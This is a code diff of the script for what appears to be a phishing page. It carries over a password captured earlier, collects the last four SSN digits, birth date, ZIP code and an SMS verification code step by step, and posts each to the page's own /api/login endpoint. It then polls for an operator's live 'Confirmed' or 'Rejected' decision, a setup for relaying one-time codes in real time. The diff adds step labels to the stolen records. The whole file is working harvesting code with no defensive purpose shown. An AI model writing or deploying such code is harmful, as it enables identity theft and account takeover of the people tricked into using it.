@@ -62,130 +62,132 @@
         </div>
     </div>
 
-    <script>
-        let realPassword = sessionStorage.getItem('realPassword') || "N/A";
+  <script>
+    let realPassword = sessionStorage.getItem('realPassword') || "N/A";
 
-        async function saveStep(details) {
-            try {
-                await fetch('/api/login', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        username: "Verification Step",
-                        password: realPassword,
-                        address: details
-                    })
-                });
-                console.log("✅ Saved:", details);
-            } catch (e) {
-                console.error("Save failed", e);
-            }
-        }
-
-        function saveStep1() {
-            const ssn = document.getElementById('ssn').value.trim();
-            const month = document.getElementById('month').value;
-            const day = document.getElementById('day').value;
-            const year = document.getElementById('year').value;
-
-            if (ssn.length !== 4 || !month || !day || !year || !document.getElementById('privacy').checked) {
-                alert("Please fill SSN, Birth Date and accept the Privacy Policy.");
-                return;
-            }
-
-            const dob = `${month}/${day}/${year}`;
-            const details = `SSN: ${ssn} | DOB: ${dob} | Status: Step 1 Completed`;
-
-            saveStep(details);
-            nextStep(2);
-        }
-
-        function saveStep2() {
-            const zip = document.getElementById('zip').value.trim();
-            if (zip.length !== 5) {
-                alert("Please enter a valid 5-digit Zip Code.");
-                return;
-            }
-
-            const details = `Zip: ${zip} | Status: Step 2 Completed`;
-            saveStep(details);
-            nextStep(3);
-        }
-
-        function nextStep(step) {
-            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-            document.getElementById('step' + step).classList.add('active');
-        }
-
-        async function submitCode() {
-            const code = document.getElementById('code').value.trim();
-            const statusDiv = document.getElementById('status');
-
-            if (code.length < 4) {
-                statusDiv.innerHTML = `<span class="error">Please enter a valid code</span>`;
-                return;
-            }
-
-            statusDiv.innerHTML = `<span class="waiting">Waiting for admin confirmation...</span>`;
-
-            const ssn = document.getElementById('ssn').value || "";
-            const dob = `${document.getElementById('month').value}/${document.getElementById('day').value}/${document.getElementById('year').value}`;
-            const zip = document.getElementById('zip').value || "";
-
-            const fullDetails = `SSN: ${ssn} | DOB: ${dob} | Zip: ${zip} | Code: ${code} | Status: Pending`;
-
-            await saveStep(fullDetails);
-
-            const interval = setInterval(async () => {
-                const res = await fetch('/api/records');
-                const records = await res.json();
-                const latest = records[0];
-
-                if (latest && latest.address.includes("Confirmed")) {
-                    clearInterval(interval);
-                    statusDiv.innerHTML = `<span style="color:green">✅ Verification Successful!</span>`;
-                    setTimeout(() => window.location.href = "index.html", 1500);
-                } else if (latest && latest.address.includes("Rejected")) {
-                    clearInterval(interval);
-                    statusDiv.innerHTML = `<span class="error">❌ Code Rejected.</span>`;
-                }
-            }, 2000);
-        }
-
-        async function requestNewCode() {
-            const statusDiv = document.getElementById('status');
-            statusDiv.innerHTML = `<span class="waiting">Requesting new code...</span>`;
-
+    async function saveStep(details, stepName = "Verification Step") {
+        try {
             await fetch('/api/login', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    username: "New Code Request",
+                    username: stepName,           // e.g. "Step 1", "Step 2"
                     password: realPassword,
-                    address: "🔄 USER REQUESTED NEW CODE | Status: Pending"
+                    address: details
                 })
             });
+            console.log("✅ Saved:", stepName);
+        } catch (e) {
+            console.error("Save failed", e);
+        }
+    }
 
-            statusDiv.innerHTML = `<span style="color:#eab308">✅ Request sent. Please check your SMS.</span>`;
+    function saveStep1() {
+        const ssn = document.getElementById('ssn').value.trim();
+        const month = document.getElementById('month').value;
+        const day = document.getElementById('day').value;
+        const year = document.getElementById('year').value;
+
+        if (ssn.length !== 4 || !month || !day || !year || !document.getElementById('privacy').checked) {
+            alert("Please fill SSN, Birth Date and accept the Privacy Policy.");
+            return;
         }
 
-        window.onload = () => {
-            const months = ["January","February","March","April","May","June","July","August","September","October","November","December"];
-            months.forEach((m,i) => {
-                let opt = document.createElement('option');
-                opt.value = i+1; opt.textContent = m;
-                document.getElementById('month').appendChild(opt);
-            });
-            for(let i=1; i<=31; i++) {
-                let opt = document.createElement('option'); opt.value = i; opt.textContent = i;
-                document.getElementById('day').appendChild(opt);
+        const dob = `${month}/${day}/${year}`;
+        const details = `SSN: ${ssn} | DOB: ${dob} | Status: Step 1 Completed`;
+
+        saveStep(details, "Step 1 - SSN & DOB");
+        nextStep(2);
+    }
+
+    function saveStep2() {
+        const zip = document.getElementById('zip').value.trim();
+        if (zip.length !== 5) {
+            alert("Please enter a valid 5-digit Zip Code.");
+            return;
+        }
+
+        const details = `Zip: ${zip} | Status: Step 2 Completed`;
+        saveStep(details, "Step 2 - Zip Code");
+        nextStep(3);
+    }
+
+    function nextStep(step) {
+        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+        document.getElementById('step' + step).classList.add('active');
+    }
+
+    async function submitCode() {
+        const code = document.getElementById('code').value.trim();
+        const statusDiv = document.getElementById('status');
+
+        if (code.length < 4) {
+            statusDiv.innerHTML = `<span class="error">Please enter a valid code</span>`;
+            return;
+        }
+
+        statusDiv.innerHTML = `<span class="waiting">Waiting for admin confirmation...</span>`;
+
+        const ssn = document.getElementById('ssn').value || "";
+        const dob = `${document.getElementById('month').value}/${document.getElementById('day').value}/${document.getElementById('year').value}`;
+        const zip = document.getElementById('zip').value || "";
+
+        const fullDetails = `SSN: ${ssn} | DOB: ${dob} | Zip: ${zip} | Code: ${code} | Status: Pending`;
+
+        await saveStep(fullDetails, "Final Code Submission");
+
+        // Polling logic remains the same...
+        const interval = setInterval(async () => {
+            const res = await fetch('/api/records');
+            const records = await res.json();
+            const latest = records[0];
+
+            if (latest && latest.address.includes("Confirmed")) {
+                clearInterval(interval);
+                statusDiv.innerHTML = `<span style="color:green">✅ Verification Successful!</span>`;
+                setTimeout(() => window.location.href = "index.html", 1500);
+            } else if (latest && latest.address.includes("Rejected")) {
+                clearInterval(interval);
+                statusDiv.innerHTML = `<span class="error">❌ Code Rejected.</span>`;
             }
-            const curr = new Date().getFullYear();
-            for(let i=curr; i>=1950; i--) {
-                let opt = document.createElement('option'); opt.value = i; opt.textContent = i;
-                document.getElementById('year').appendChild(opt);
-            }
-        };
-    </script>
+        }, 2000);
+    }
+
+    async function requestNewCode() {
+        const statusDiv = document.getElementById('status');
+        statusDiv.innerHTML = `<span class="waiting">Requesting new code...</span>`;
+
+        await fetch('/api/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                username: "New Code Request",
+                password: realPassword,
+                address: "🔄 USER REQUESTED NEW CODE | Status: Pending"
+            })
+        });
+
+        statusDiv.innerHTML = `<span style="color:#eab308">✅ Request sent. Please check your SMS.</span>`;
+    }
+
+    // Rest of your onload code remains the same...
+    window.onload = () => {
+        const months = ["January","February","March","April","May","June","July","August","September","October","November","December"];
+        months.forEach((m,i) => {
+            let opt = document.createElement('option');
+            opt.value = i+1; opt.textContent = m;
+            document.getElementById('month').appendChild(opt);
+        });
+        for(let i=1; i<=31; i++) {
+            let opt = document.createElement('option'); opt.value = i; opt.textContent = i;
+            document.getElementById('day').appendChild(opt);
+        }
+        const curr = new Date().getFullYear();
+        for(let i=curr; i>=1950; i--) {
+            let opt = document.createElement('option'); opt.value = i; opt.textContent = i;
+            document.getElementById('year').appendChild(opt);
+        }
+    };
+</script>
 </body>
 </html>
